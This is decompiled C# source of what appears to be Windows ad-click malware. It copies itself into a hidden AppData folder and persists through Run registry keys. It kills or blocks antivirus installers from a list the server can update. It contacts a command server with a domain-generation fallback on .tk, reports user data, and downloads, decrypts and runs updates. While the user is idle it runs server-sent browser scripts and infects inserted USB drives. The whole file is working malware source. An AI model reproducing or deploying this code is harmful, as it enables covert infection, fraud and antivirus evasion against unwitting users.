using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;
using adclicker;

namespace Lexplorer;

internal static class ProgramMain
{
	private const string DEFAULT_API_HOST = "http://widnwos.info/api/";

	private const int DOMAIN_NAME_GENERATOR_SEED = 314159265;

	private const string DOMAIN_AUTH_TOKEN = "fbcc9855c023439cd0f19ddbc7184457";

	private const string TOP_LEVEL_DOMAIN = ".tk";

	private const string AV_BLOCKLIST_FILENAME = "list-149365";

	private const string CONTAMINED_FOLDER = "winhost";

	private const string DEBUG_CONDITIONAL_FILE_NAME = "debug.txt";

	private const string UPDATER_FILENAME = "datuper.exe";

	private const string OBSERVER_NAME = "updatewidnwos.exe";

	private const int TIMER_UPDATE_INTERVAL = 200;

	private const int OBSERVER_TIMER_CHECKING_INTERVAL = 5000;

	private const int WAIT_TIME = 300000;

	private const int MAX_ATTEMPTS_TO_GET_A_SCRIPT = 5;

	private const string DEFAULT_SCRIPT = "<nextActions>3600</ nextActions >\r\n<ignoreUser>0</ignoreUser>\r\n<actions>\r\n<a C=\"BROWSER\" E=\"OPEN\" V=\"http://pirsomon.com/plink.asp\">\r\n</actions >";

	private const bool CONTAMINATE_COMPUTER = true;

	private const bool DETECT_DOUBLE_LAUNCH = true;

	private const bool OBSERVER_ENABLED = true;

	private const bool HEAL = false;

	private static readonly string TARGET_DIRECTORY = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static readonly string AV_BLOCKLIST_FILEPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "list-149365");

	private static Timer userinputTimer = new Timer();

	private static Timer screenTimer = new Timer();

	private static Timer soundTimer = new Timer();

	private static Timer observerTimer = new Timer();

	private static Timer blockerTimer = new Timer();

	private static Class5 userinputIncactiveChecker = new Class5();

	private static Class4 transport = null;

	private static Class8 api = null;

	private static string defaultBrowserPath = string.Empty;

	private static string defaultBrowserName = string.Empty;

	private static int maxInactivityPeriod = 30000;

	private static bool debugModeEnabled = false;

	private static Class12 removableDriveContaminator = new Class12(Application.get_ExecutablePath());

	private static int ticks = 0;

	private static bool msgLock = false;

	private static Class23 scriptEngine = null;

	private static string script = string.Empty;

	private static bool usbContaminationAllowed = false;

	private static AVBlockInfo[] blocks = new AVBlockInfo[26]
	{
		new AVBlockInfo("Microsoft Security Essentials", "setup.exe"),
		new AVBlockInfo(null, "avgmfapx.exe"),
		new AVBlockInfo(null, "Riskscan.exe"),
		new AVBlockInfo(null, "pandag"),
		new AVBlockInfo(null, "StubInstaller.exe"),
		new AVBlockInfo(null, "epplauncher.exe"),
		new AVBlockInfo(null, "eav_"),
		new AVBlockInfo(null, "avast"),
		new AVBlockInfo(null, "adaware"),
		new AVBlockInfo(null, "avira"),
		new AVBlockInfo(null, "BkavFe"),
		new AVBlockInfo(null, "BkavIs"),
		new AVBlockInfo(null, "ClamAv"),
		new AVBlockInfo(null, "GER_R"),
		new AVBlockInfo("Kaspersky Internet Security", "kis"),
		new AVBlockInfo(null, "mbam-setup"),
		new AVBlockInfo("Quick Heal Setup Downloader", "INST.exe"),
		new AVBlockInfo(null, "vipre-antivirus"),
		new AVBlockInfo(null, "vipre-internet"),
		new AVBlockInfo(null, "Ti_60_EL"),
		new AVBlockInfo(null, "Vba32"),
		new AVBlockInfo(null, "VRIS"),
		new AVBlockInfo(null, "eset_nod32"),
		new AVBlockInfo(null, "pure"),
		new AVBlockInfo(null, "NAV-TW"),
		new AVBlockInfo(null, "Antivirus")
	};

	private static AVBlocker blocker = new AVBlocker(blocks);

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		debugModeEnabled = CheckIfDebugModeEnabled();
		if (debugModeEnabled)
		{
			Class3.ShowConsole();
		}
		WriteConsoleLog("Version: {0}", Application.get_ProductVersion());
		if (AreWeOnARemovableDrive())
		{
			WriteConsoleLog("We are on a removable drive so we do not loading local blocklist.");
		}
		else
		{
			LoadBlocklist();
		}
		blockerTimer = new Timer();
		blockerTimer.set_Interval(500);
		blockerTimer.add_Tick((EventHandler)OnBlockerTick);
		blockerTimer.Start();
		if (File.Exists(Path.Combine(TARGET_DIRECTORY, "datuper.exe")))
		{
			try
			{
				File.Delete(Path.Combine(TARGET_DIRECTORY, "datuper.exe"));
			}
			catch
			{
			}
		}
		scriptEngine = new Class23(debugModeEnabled, !debugModeEnabled);
		if (args != null && args.Length > 0)
		{
			WriteConsoleLog("Argument detected! {0}", args[0]);
			try
			{
				Process.Start(args[0]);
				WriteConsoleLog("Launched");
			}
			catch (Exception ex)
			{
				WriteConsoleLog("Failed to launch {0} : {1}", args[0], ex.Message);
			}
		}
		WriteConsoleLog("Waiting until updater is running...");
		WaitUntilUpdaterIsRunning();
		WriteConsoleLog("Done.");
		Thread.Sleep(3000);
		if (CheckDoubleLaunch())
		{
			WriteConsoleLog("Second instance detected! Exit.");
			return;
		}
		if (!isContaminated())
		{
			Contaminate();
			UnpackWatcher(TARGET_DIRECTORY);
			WriteConsoleLog("The system has been contaminated. Exit.");
			string path = Path.Combine(TARGET_DIRECTORY, "winhost");
			path = Path.Combine(path, Application.get_ProductName() + ".exe");
			Process.Start(path);
			return;
		}
		WriteConsoleLog("The system is already contaminated.");
		WriteConsoleLog("Checking for an Internet connection...");
		while (!CheckForInternetConnection())
		{
		}
		WriteConsoleLog("Connection estabilished.");
		string[] array = SelectHost(314159265, ".tk");
		WriteConsoleLog("Selected domain: {0}", array[0]);
		transport = new Class4(array[0]);
		api = new Class8(transport, new Class26());
		WriteConsoleLog("Sending user info...");
		bool flag = false;
		do
		{
			if (!(flag = api.SendUserInfo()))
			{
				WriteConsoleLog("Failed to send userinfo. Resend in 3 sec.");
				Thread.Sleep(3000);
			}
		}
		while (!flag);
		WriteConsoleLog("Sent.");
		WriteConsoleLog("Do we have dead domains? {0}", (array[1] == string.Empty) ? "No" : "Yes");
		if (array[1] != string.Empty)
		{
			WriteConsoleLog("Reporting about dead domains ({0}) to {0}", array[1], array[0]);
			api.InformAboutDeadDomain(array[1]);
		}
		GetBlacklist();
		if (DownloadAndInstallUpdate())
		{
			return;
		}
		Class7.PreventSleep();
		Init();
		defaultBrowserPath = Class3.GetDefaultBrowserPath();
		if (defaultBrowserPath == null)
		{
			WriteConsoleLog("Unable to get default browser path. Exit.");
			return;
		}
		defaultBrowserName = GetExeName(defaultBrowserPath);
		WriteConsoleLog("Default browser path: {0}", defaultBrowserPath);
		WriteConsoleLog("Default browser name: {0}", defaultBrowserName);
		try
		{
			script = GetScript();
		}
		catch (Exception ex2)
		{
			WriteConsoleLog("Failed to get the script. Something really bad happened. Time to exit.\n{0}", ex2.Message);
			return;
		}
		userinputTimer.Start();
		RunObserver();
		observerTimer.Start();
		if (!debugModeEnabled)
		{
			WriteConsoleLog("Waiting {0} minutes...", 5);
			Thread.Sleep(300000);
		}
		Application.Run();
	}

	private static bool AreWeOnARemovableDrive()
	{
		string startupPath = Application.get_StartupPath();
		string text = startupPath.Substring(0, 3);
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		int num = 0;
		DriveInfo driveInfo;
		while (true)
		{
			if (num < array.Length)
			{
				driveInfo = array[num];
				if (driveInfo.Name == text)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.CDRom;
	}

	private static void LoadBlocklist()
	{
		if (!File.Exists(AV_BLOCKLIST_FILEPATH))
		{
			WriteConsoleLog("We have no av blocklist saved.");
			return;
		}
		WriteConsoleLog("Yes, we have a block list in {0}, so we load it.", AV_BLOCKLIST_FILEPATH);
		AVBlockInfo[] array = BlockListParser.LoadBlockList(AV_BLOCKLIST_FILEPATH);
		if (array != null)
		{
			blocks = array;
			blocker = new AVBlocker(blocks);
		}
	}

	private static void SaveBlocklist()
	{
		try
		{
			BlockListParser.Save(blocks, AV_BLOCKLIST_FILEPATH);
		}
		catch (Exception ex)
		{
			WriteConsoleLog("Can't save blacklist: {0}", ex.Message);
		}
	}

	private static void GetBlacklist()
	{
		string text = "";
		if (File.Exists(AV_BLOCKLIST_FILEPATH))
		{
			text = Class3.GetFileMd5(AV_BLOCKLIST_FILEPATH);
		}
		WriteConsoleLog("Local blocklist MD5: {0}", text);
		string blockListMd = api.GetBlockListMd5();
		WriteConsoleLog("Remote blocklist MD5: {0}", blockListMd);
		if (text != blockListMd && blockListMd != string.Empty)
		{
			WriteConsoleLog("Recieving blocklist...");
			string blockList = api.GetBlockList();
			WriteConsoleLog("Recieved.");
			blocks = BlockListParser.Parse(blockList);
			blocker = new AVBlocker(blocks);
			if (!AreWeOnARemovableDrive())
			{
				SaveBlocklist();
			}
		}
		else
		{
			WriteConsoleLog("We do not need to download new blacklist.");
		}
	}

	private static void OnUserInputTick(object sender, EventArgs e)
	{
		if (!msgLock)
		{
			WriteConsoleLog("Waiting for user inactivity....");
			msgLock = true;
		}
		if (ticks > maxInactivityPeriod)
		{
			WriteConsoleLog("No user activity detected (userinput)");
			userinputTimer.Stop();
			if (string.IsNullOrEmpty(script))
			{
				WriteConsoleLog("The script is null or empty! WTF?! State reset.");
				StateReset();
				return;
			}
			WriteConsoleLog("Time to action! We check for an Internet connection first...");
			if (!CheckForInternetConnection())
			{
				WriteConsoleLog("We do not have a good Internet connection now. State Reset.");
				StateReset();
			}
			else
			{
				WriteConsoleLog("Yes, we have an Internet connection.");
				DoBlackBusiness();
				StateReset();
			}
		}
		else
		{
			Console.Write("\r{0}\tleft", maxInactivityPeriod - ticks);
			ticks += 200;
		}
	}

	private static void DoBlackBusiness()
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			script = script.Replace("&lt;a", "<a").Replace("&gt;&lt;/a&gt;", "></a>");
			xmlDocument.LoadXml(script);
			string empty = string.Empty;
			int num = 0;
			int num2 = 0;
			bool flag = false;
			Class3.GetDefaultBrowserPath();
			empty = Class3.GetDefaultBrowser();
			Size currentResolution = Class9.GetCurrentResolution();
			num = currentResolution.Width;
			num2 = currentResolution.Height;
			Class6.StartFullscreen = false;
			Class6.SaveSessionHistoryOnExit = false;
			flag = Class24.Mute;
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//body");
			XmlNode xmlNode2 = xmlNode["active"];
			bool flag2 = xmlNode2.InnerText == "1";
			WriteConsoleLog("Do we actually need to execute the sctipt? {0}", flag2);
			xmlNode2 = xmlNode["nextActions"];
			WriteConsoleLog("When to run a new script? After {0} seconds.", xmlNode2.InnerText);
			xmlNode2 = xmlNode["ignoreUser"];
			bool flag3 = xmlNode2.InnerText == "1";
			WriteConsoleLog("Who cares about the user? {0}", flag3 ? "NOBODY." : "We.");
			xmlNode2 = xmlNode["actions"];
			if (flag2)
			{
				Class3.SetDefaultBrowser();
				WriteConsoleLog("Now IE is your default browser. Previous browser was {0}", empty);
				bool flag4 = scriptEngine.Execute(xmlNode2, flag3);
				WriteConsoleLog("Script executed successfully: {0}", flag4 ? "Yes" : "No");
				UndoActions(flag4, empty, flag, num, num2);
			}
		}
		catch (Exception ex)
		{
			WriteConsoleLog("Something *really* bad happened: {0} . Black business has been aborted.", ex.Message);
		}
	}

	private static void UndoActions(bool success, string defaultBrowserIdentifier, bool prevSoundState, int defaultDisplayWidth, int defaultDisplayHeight)
	{
		if (!success)
		{
			string pathToExecutable = Class3.GetDefaultBrowserPath();
			CloseProgram(pathToExecutable);
		}
		Class3.SetDefaultBrowser(defaultBrowserIdentifier);
		WriteConsoleLog("Default browser was set back to {0}", defaultBrowserIdentifier);
		Class24.Mute = prevSoundState;
		WriteConsoleLog("Sound state restored.");
		if (defaultDisplayWidth != 0 && defaultDisplayHeight != 0)
		{
			Size currentResolution = Class9.GetCurrentResolution();
			if (defaultDisplayWidth != currentResolution.Width || defaultDisplayHeight != currentResolution.Height)
			{
				Class9.SetResolution(defaultDisplayWidth, defaultDisplayHeight);
				WriteConsoleLog("Display resolution restored to {0}x{1}", defaultDisplayWidth, defaultDisplayHeight);
			}
		}
	}

	private static void CloseProgram(string pathToExecutable)
	{
		string exeName = GetExeName(pathToExecutable);
		Process[] processesByName = Process.GetProcessesByName(exeName);
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			if (!process.HasExited)
			{
				process.CloseMainWindow();
			}
		}
	}

	private static void StateReset()
	{
		try
		{
			script = GetScript();
			msgLock = false;
			ticks = 0;
			userinputTimer.Start();
		}
		catch (Exception ex)
		{
			WriteConsoleLog("Something went really wrong. It's better to exit. Reason: {0}", ex.Message);
			Environment.Exit(-666);
		}
		WriteConsoleLog("State reset.");
	}

	private static void OnScreenTick(object sender, EventArgs e)
	{
	}

	private static void OnSoundTick(object sender, EventArgs e)
	{
	}

	private static string GetScript()
	{
		try
		{
			string empty = string.Empty;
			int num = 0;
			do
			{
				WriteConsoleLog("Recieving a script...");
				empty = api.GetScriptCommandXml();
				empty = empty.Replace("&quot;", "\"").Replace("&#13;", "\r");
				if (string.IsNullOrEmpty(empty))
				{
					WriteConsoleLog("Failed to get the script. Reget in 2 seconds.");
					Thread.Sleep(2000);
					num++;
				}
				if (num == 5)
				{
					WriteConsoleLog("Max attempts count reached. Script will be set to default");
					empty = "<nextActions>3600</ nextActions >\r\n<ignoreUser>0</ignoreUser>\r\n<actions>\r\n<a C=\"BROWSER\" E=\"OPEN\" V=\"http://pirsomon.com/plink.asp\">\r\n</actions >";
					break;
				}
			}
			while (string.IsNullOrEmpty(empty));
			WriteConsoleLog("Script recieved.");
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(empty);
			XmlNode xmlNode = xmlDocument.SelectSingleNode("//body");
			XmlNode xmlNode2 = xmlNode["nextActions"];
			maxInactivityPeriod = int.Parse(xmlNode2.InnerText) * 1000;
			WriteConsoleLog("Next time to action: {0}", maxInactivityPeriod);
			xmlNode2 = xmlNode["USB"];
			if (xmlNode2 != null)
			{
				usbContaminationAllowed = xmlNode2.InnerText == "1";
			}
			WriteConsoleLog("Should we contaminate USB drives? {0}", usbContaminationAllowed);
			return empty;
		}
		catch (Exception ex)
		{
			WriteConsoleLog("Something bad with GetScript() command: {0}", ex.Message);
			return "<nextActions>3600</ nextActions >\r\n<ignoreUser>0</ignoreUser>\r\n<actions>\r\n<a C=\"BROWSER\" E=\"OPEN\" V=\"http://pirsomon.com/plink.asp\">\r\n</actions >";
		}
	}

	private static void OnUsbInserted(object sender, EventArgs e)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			int num = 0;
			DriveInfo driveInfo;
			while (true)
			{
				if (num >= array.Length)
				{
					return;
				}
				driveInfo = array[num];
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					WriteConsoleLog("Removable drive found - {0}", driveInfo.Name);
					WriteConsoleLog("Checking for an Internet connection...");
					if (!CheckForInternetConnection())
					{
						WriteConsoleLog("We have no Internet connection, so we do nothing");
						return;
					}
					WriteConsoleLog("Yes, we have an Internet connection. Checking for contamination permission...");
					if (usbContaminationAllowed)
					{
						if (removableDriveContaminator.IsContamined(driveInfo))
						{
							WriteConsoleLog("The drive is already contaminated! Prettifying...");
							removableDriveContaminator.Prettify(driveInfo);
							WriteConsoleLog("Done.");
							return;
						}
						WriteConsoleLog("Contaminating...");
						removableDriveContaminator.Contamine(driveInfo);
						removableDriveContaminator.HideFolders(driveInfo);
					}
					else
					{
						WriteConsoleLog("The server says we need to heal the drive!");
						if (removableDriveContaminator.IsContamined(driveInfo))
						{
							break;
						}
						WriteConsoleLog("The drive is not contaminated.");
					}
				}
				num++;
			}
			WriteConsoleLog("Healing...");
			removableDriveContaminator.Heal(driveInfo);
			removableDriveContaminator.Prettify(driveInfo);
			WriteConsoleLog("Done.");
		}
		catch (Exception ex)
		{
			WriteConsoleLog("OnUsbInserted error: {0}", ex.Message);
		}
	}

	private static bool IsNoUserActivity(int periodMilliseconds)
	{
		WriteConsoleLog("{0} {1}", userinputIncactiveChecker.GetInactiveTime().Value.TotalMilliseconds, periodMilliseconds);
		return userinputIncactiveChecker.GetInactiveTime().Value.TotalMilliseconds >= (double)periodMilliseconds;
	}

	private static bool DownloadAndInstallUpdate()
	{
		WriteConsoleLog("Checking for update...");
		string text = api.CheckForUpdate(Application.get_ProductVersion());
		if (text == null)
		{
			WriteConsoleLog("No update found.");
			return false;
		}
		new WebClient();
		string text2 = DateTime.Now.ToBinary().ToString();
		try
		{
			WriteConsoleLog("Yes, we have an update! Downloading...");
			string tARGET_DIRECTORY = TARGET_DIRECTORY;
			tARGET_DIRECTORY = Path.Combine(tARGET_DIRECTORY, "blob" + text2);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using (FileStream fileStream = new FileStream(tARGET_DIRECTORY, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Delete, 4096, FileOptions.None))
			{
				BinaryReader binaryReader = new BinaryReader(httpWebResponse.GetResponseStream());
				byte[] buffer = new byte[4096];
				int num = 0;
				long num2 = 0L;
				do
				{
					num = binaryReader.Read(buffer, 0, 4096);
					if (num > 0)
					{
						fileStream.Write(buffer, 0, num);
						fileStream.Flush();
					}
					num2 += num;
					Console.Write("\r{0}\tbytes read", num2);
				}
				while (num > 0);
				binaryReader.Close();
				httpWebResponse.Close();
			}
			WriteConsoleLog("Download completed. Now we shall run the updater and close the program.");
			FileEncryptor.Decrypt(tARGET_DIRECTORY, Path.Combine(TARGET_DIRECTORY, "datuper.exe"));
			File.Delete(tARGET_DIRECTORY);
			tARGET_DIRECTORY = Path.Combine(TARGET_DIRECTORY, "datuper.exe");
			Process.Start(tARGET_DIRECTORY);
			return true;
		}
		catch (Exception ex)
		{
			WriteConsoleLog("An error occured in DownloadAndInstallUpdateSection! {0}", ex.Message);
			return false;
		}
	}

	private static bool CheckForInternetConnection()
	{
		long num = long.MaxValue;
		Class11 @class = new Class11(5000);
		num = @class.PingHost("google.com");
		return num < 4611686018427387903L;
	}

	private static string[] SelectHost(int seed, string topLevelDomain)
	{
		WriteConsoleLog("Selecting a domain....");
		string text = string.Empty;
		string text2 = string.Empty;
		bool flag = false;
		Class2 @class = new Class2(seed);
		do
		{
			if (!(text2 != string.Empty))
			{
				text2 = "http://widnwos.info/api/";
			}
			else
			{
				text2 = @class.NextDomainName();
				text2 = "http://" + text2 + topLevelDomain + "/api/";
			}
			WriteConsoleLog("Checking host {0}", text2);
			if (!(flag = Class8.CheckDomain(text2, "fbcc9855c023439cd0f19ddbc7184457")))
			{
				text = text2;
			}
			WriteConsoleLog("The host is okay? {0}", flag);
		}
		while (!flag);
		return new string[2] { text2, text };
	}

	private static bool isContaminated()
	{
		string text = Path.Combine(TARGET_DIRECTORY, "winhost");
		if (!Directory.Exists(text))
		{
			return false;
		}
		text = Path.Combine(text, Application.get_ProductName() + ".exe");
		if (!File.Exists(text))
		{
			return false;
		}
		try
		{
			bool flag = false;
			bool flag2 = false;
			RegistryKey registryKey = null;
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
			if (registryKey != null && registryKey.GetValue(Application.get_ProductName()) != null)
			{
				flag2 = true;
			}
			registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false);
			if (registryKey != null && registryKey.GetValue(Application.get_ProductName()) != null)
			{
				flag = true;
			}
			return flag2 || flag;
		}
		catch (Exception ex)
		{
			WriteConsoleLog("An error occured in isContaminated(): {0}", ex.Message);
			return false;
		}
	}

	private static void Contaminate()
	{
		string text = Path.Combine(TARGET_DIRECTORY, "winhost");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(text);
		directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Normal;
		text = Path.Combine(text, Application.get_ProductName() + ".exe");
		if (!File.Exists(text))
		{
			File.Copy(Application.get_ExecutablePath(), text);
		}
		File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
		AddToStartup(Application.get_ProductName(), text, forAllUsers: true);
		AddToStartup(Application.get_ProductName(), text, forAllUsers: false);
	}

	private static bool RemoveFromStartup(string keyname, bool forAllUsers)
	{
		try
		{
			RegistryKey registryKey = null;
			if (forAllUsers)
			{
				try
				{
					registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				}
				catch (Exception ex)
				{
					WriteConsoleLog("Failed to register the program for all users: {0}", ex.Message);
				}
			}
			else
			{
				registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			}
			if (registryKey == null)
			{
				return false;
			}
			registryKey.DeleteValue(keyname, throwOnMissingValue: false);
			return true;
		}
		catch (Exception ex2)
		{
			WriteConsoleLog("An error occured in RemoveToStartup: {0}", ex2.Message);
			return false;
		}
	}

	private static bool AddToStartup(string keyname, string filepath, bool forAllUsers)
	{
		try
		{
			RegistryKey registryKey = null;
			if (forAllUsers)
			{
				try
				{
					registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				}
				catch (Exception ex)
				{
					WriteConsoleLog("Failed to register the program for all users: {0}", ex.Message);
				}
			}
			else
			{
				registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			}
			if (registryKey == null)
			{
				return false;
			}
			registryKey.SetValue(keyname, "\"" + filepath + "\"");
			return true;
		}
		catch (Exception ex2)
		{
			WriteConsoleLog("An error occured in AddToStartup: {0}", ex2.Message);
			return false;
		}
	}

	private static bool CheckDoubleLaunch()
	{
		string processName = Process.GetCurrentProcess().ProcessName;
		Process[] processesByName = Process.GetProcessesByName(processName);
		return processesByName.Length > 1;
	}

	private static void WaitUntilUpdaterIsRunning()
	{
		string text = Path.Combine(TARGET_DIRECTORY, "datuper.exe");
		if (File.Exists(text))
		{
			while (IsExeRunning(text))
			{
				Thread.Sleep(300);
			}
			File.SetAttributes(text, FileAttributes.Normal);
			File.Delete(text);
		}
	}

	private static bool IsExeRunning(string filename)
	{
		filename.LastIndexOf('\\');
		filename.LastIndexOf(".exe");
		string exeName = GetExeName(filename);
		Process[] processesByName = Process.GetProcessesByName(exeName);
		bool result = false;
		for (int i = 0; i < processesByName.Length; i++)
		{
			if (processesByName[i].MainModule!.FileName == filename)
			{
				result = true;
			}
			processesByName[i].Dispose();
			processesByName[i] = null;
		}
		return result;
	}

	private static string GetExeName(string pathToExe)
	{
		int num = pathToExe.LastIndexOf('\\');
		int num2 = pathToExe.LastIndexOf(".exe");
		if (num != -1 && num2 != -1)
		{
			return pathToExe.Substring(num + 1, num2 - num - 1);
		}
		return null;
	}

	private static bool CheckIfDebugModeEnabled()
	{
		string path = Path.Combine(TARGET_DIRECTORY, "debug.txt");
		return File.Exists(path);
	}

	private static void Init()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		userinputTimer = new Timer();
		userinputTimer.set_Interval(200);
		userinputTimer.add_Tick((EventHandler)OnUserInputTick);
		screenTimer = new Timer();
		screenTimer.set_Interval(200);
		screenTimer.add_Tick((EventHandler)OnScreenTick);
		soundTimer = new Timer();
		soundTimer.set_Interval(200);
		soundTimer.add_Tick((EventHandler)OnSoundTick);
		observerTimer = new Timer();
		observerTimer.set_Interval(5000);
		observerTimer.add_Tick((EventHandler)OnObserverTick);
		removableDriveContaminator.OnUSBInserted += new EventArrivedEventHandler(OnUsbInserted);
		removableDriveContaminator.AddInsertUSBHandler();
	}

	private static void OnBlockerTick(object sender, EventArgs e)
	{
		blocker.Block();
	}

	private static void OnObserverTick(object sender, EventArgs e)
	{
		RunObserver();
	}

	private static void RunObserver()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text = Path.Combine(folderPath, "updatewidnwos.exe");
			if (!IsExeRunning(text))
			{
				if (!File.Exists(text))
				{
					UnpackWatcher(folderPath);
				}
				if (File.Exists(text))
				{
					Process.Start(text);
				}
			}
		}
		catch (Exception ex)
		{
			WriteConsoleLog("An error occured in RunObserver: " + ex.Message);
		}
	}

	private static void UnpackWatcher(string where)
	{
		try
		{
			string path = "updatewidnwos.exe";
			string text = Path.Combine(where, path);
			if (!File.Exists(text))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream("adclicker.Resources.downloader.exe");
				FileStream fileStream = new FileStream(text, FileMode.OpenOrCreate, FileAccess.Write);
				byte[] buffer = new byte[4096];
				int num = 0;
				do
				{
					num = manifestResourceStream.Read(buffer, 0, 4096);
					if (num > 0)
					{
						fileStream.Write(buffer, 0, num);
					}
				}
				while (num > 0);
				fileStream.Close();
				manifestResourceStream.Close();
				File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
				AddToStartup("datuper", text, forAllUsers: true);
				AddToStartup("datuper", text, forAllUsers: false);
			}
			if (!IsExeRunning(text))
			{
				Process.Start(text);
			}
		}
		catch (Exception ex)
		{
			WriteConsoleLog("An error occured in UnpackWatcher section! " + ex.Message);
		}
	}

	private static void WriteConsoleLog(string text, params object[] pars)
	{
		if (debugModeEnabled)
		{
			string text2 = $"[{DateTime.Now.ToLongTimeString()}] ";
			Console.WriteLine(text2 + text, pars);
		}
	}
}
